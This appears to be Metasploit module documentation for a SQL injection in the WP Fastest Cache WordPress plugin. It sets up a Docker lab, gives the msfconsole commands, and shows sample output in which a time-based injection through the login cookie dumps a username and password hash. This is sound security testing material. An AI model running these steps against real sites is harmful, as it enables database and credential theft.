## Vulnerable Application

The vulnerability affects the **WP Fastest Cache** plugin, version **1.2.2** and below, allowing SQL injection via a multipart form.

### Pre-requisites:
   - **Docker** and **Docker Compose** installed on your system.

### Setup Instructions:

1. **Download the Docker Compose file**:
   - Here is the content of the **docker-compose.yml** file to set up
   WordPress with the vulnerable WP Fastest Cache plugin and a MySQL database.

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

2. **Start the Docker environment**:
   - In the directory where you saved the `docker-compose.yml` file, run the following command to start the services:

```bash
docker-compose up -d
```

3. **Install WP Fastest Cache Plugin**:
   - Download the vulnerable version of WP Fastest Cache:

```bash
wget https://downloads.wordpress.org/plugin/wp-fastest-cache.1.2.1.zip
```

   - Install the plugin in your running WordPress instance:
     - Extract the plugin files and copy them to your WordPress container:

```bash
unzip wp-fastest-cache.1.2.1.zip
docker cp wp-fastest-cache wordpress:/var/www/html/wp-content/plugins/
```

   - Navigate to `http://localhost:5555/wp-admin` in your browser and activate the **WP Fastest Cache** plugin in the WordPress admin panel.

4. **Enable Permalinks and Caching**:
   - Go to `Settings > Permalinks` in the WordPress dashboard and set permalinks to **Post name**.
   - Activate the caching feature in the WP Fastest Cache settings.

## Verification Steps

1. **Set up WordPress** with the vulnerable **WP Fastest Cache 1.2.1** plugin.
2. **Start Metasploit** using the command `msfconsole`.
3. Use the correct module for the vulnerability:

```bash
   use auxiliary/scanner/http/wp_fastest_cache_sqli
```

4. Set the target's IP and URI:

```bash
   set RHOST <target_ip>
   set TARGETURI /
```

5. **Run the module**:

```bash
   run
```

6. **Verify the SQL Injection**:
   - After running the module, the SQL injection payload will attempt to retrieve or manipulate data from the WordPress database.

## Options

### COUNT
This option specifies the number of rows to retrieve from the database during the SQL injection attack.
For example, setting `COUNT` to 5 will retrieve 5 rows from the `wp_users` table.

## Scenarios

The following scenario demonstrates an SQL injection attack against a WordPress
installation running **WP Fastest Cache <= 1.2.1** on a Docker environment with MySQL.

### Step-by-step Scenario

```bash
msf6 auxiliary(scanner/http/wp_fastest_cache_sqli) > run http://127.0.0.1:5555

[*] Performing SQL injection via the 'wordpress_logged_in' cookie...
[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(chQnW) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) chQnW from wp_users limit 1) hsbomFD)
[*] {SQLi} Encoded to (select group_concat(chQnW) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xe4,0)),ifnull(user_pass,repeat(0x57,0))) as binary) chQnW from wp_users limit 1) hsbomFD)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] Dumped table contents:
wp_users
========

 user_login  user_pass
 ----------  ---------
 chocapikk   $P$BPdY0XccQT2nvSXE8bjsn1CERoF7eJ.

[+] Loot saved to: /home/chocapikk/.msf4/loot/20240919001325_default_127.0.0.1_wordpress.users_514832.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
